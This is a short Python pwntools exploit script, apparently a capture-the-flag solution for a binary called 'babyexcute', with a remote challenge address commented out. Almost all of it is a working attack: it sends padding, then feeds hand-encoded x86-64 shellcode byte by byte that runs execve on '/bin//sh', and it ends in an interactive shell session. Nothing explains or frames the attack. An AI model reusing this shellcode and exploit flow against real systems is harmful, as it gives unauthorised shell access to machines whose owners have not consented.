from pwn import *

elf = ELF("./babyexcute")
context.arch = 'amd64'
p = elf.process()
#p = remote("103.107.183.244", 9704)
raw_input("DEBUG")

shell = asm('''
    mov rax, 0x000067616c662f66
    push rax 
''')

p.sendlineafter("Input your name to edit:",b"A"*10)

shell = [b"80",b"72", b"191", b"47", b"98", b"105", b"110", b"47", b"47", b"115", b"104", b"72", b"49", b"246", b"72", b"49", b"210", b"176", b"59", b"87",b"84",b"95",b"15", b"5"] 
for i in shell:
	p.sendline(i)

p.interactive()

